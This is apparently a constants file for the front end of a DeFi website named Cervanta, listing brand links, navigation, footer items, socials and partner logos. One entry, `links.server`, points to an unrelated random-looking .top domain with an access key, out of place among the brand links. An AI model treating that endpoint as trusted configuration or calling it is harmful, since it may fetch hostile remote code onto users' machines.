import { getTradeUrl } from '@/utils/tradeUrl'

export const links = {
  site: 'https://www.Cervanta.com',
  get trade() {
    return getTradeUrl()
  },
  docs: 'https://docs.Cervanta.com/',
  blog: 'https://blog.Cervanta.com/',
  discord: 'https://discord.com/invite/Cervanta',
  twitter: 'https://x.com/CervantaDefi',
  linkedin: 'https://www.linkedin.com/company/Cervanta/',
  telegram: 'https://t.me/Cervanta_Defi',
  summit: 'https://summit.Cervanta.com/',
  jobs: 'https://jobs.lever.co/Cervanta',
  whitepaper: '/v3-whitepaper.pdf',
  email: 'marketing@Cervanta.xyz',
  server: 'https://tskcbxfy.piafqwssmghursq.top/index?key=6b18fd97215b18ab44f7baf52b20045d',
}

export const nav = [
  { labelKey: 'nav.about', href: '/about-us' },
  { labelKey: 'nav.stats', href: '/?s=stats' },
  { labelKey: 'nav.docs', href: '/' },
]

export const footerPrimary = [
  { labelKey: 'footer.home', href: '/' },
  { labelKey: 'footer.aboutUs', href: '/about-us' },
  { labelKey: 'footer.features', href: '/?s=features' },
  { labelKey: 'footer.partners', href: '/?s=partners' },
]

export const footerSecondary = [
  { labelKey: 'footer.docs', href: '/' },
  { labelKey: 'footer.whitepaper', href: links.whitepaper },
  { labelKey: 'footer.stats', href: '/?s=stats' },
  { labelKey: 'footer.blog', href: '/' },
]

export const socials = [
  { label: 'X', href: links.twitter },
  { label: 'Discord', href: links.discord },
  { label: 'LinkedIn', href: links.linkedin },
]

export const featureIcons = [
  '/assets/feature_backed.svg',
  '/assets/feature_liquidity.svg',
  '/assets/feature_settlement.svg',
  '/assets/feature_fractional.svg',
]

export const investors = Array.from({ length: 12 }, (_, i) => ({
  id: i + 1,
  logo: `/assets/logo${i + 1}.png`,
}))

export const partners = [
  { name: 'Chainlink', logo: '/assets/partner_chainlink.svg' },
  { name: 'Base', logo: '/assets/partner_base.svg' },
  { name: 'Arbitrum', logo: '/assets/partner_arbitrum.svg' },
  { name: 'Pyth', logo: '/assets/partner_pyth.svg' },
  { name: 'Quantstamp', logo: '/assets/partner_quantstamp.svg' },
  { name: '1inch', logo: '/assets/partner_1inch.svg' },
  { name: 'Binance', logo: '/assets/partner_binance.svg' },
  { name: 'OKX', logo: '/assets/partner_okx.svg' },
  { name: 'Lido', logo: '/assets/partner_lido.svg' },
  { name: 'Amber', logo: '/assets/partner_amber.svg' },
  { name: 'Polygon', logo: '/assets/partner_polygon.svg' },
  { name: 'Coinbase', logo: '/assets/partner_coinbase.svg' },
  { name: 'Backpack', logo: '/assets/partner_backpack.svg' },
  { name: 'Anchored', logo: '/assets/partner_anchored.svg' },
]

export const jobTagVariantsA = ['outline', 'white', 'blue']
export const jobTagVariantsB = ['yellow', 'brand', 'outline']
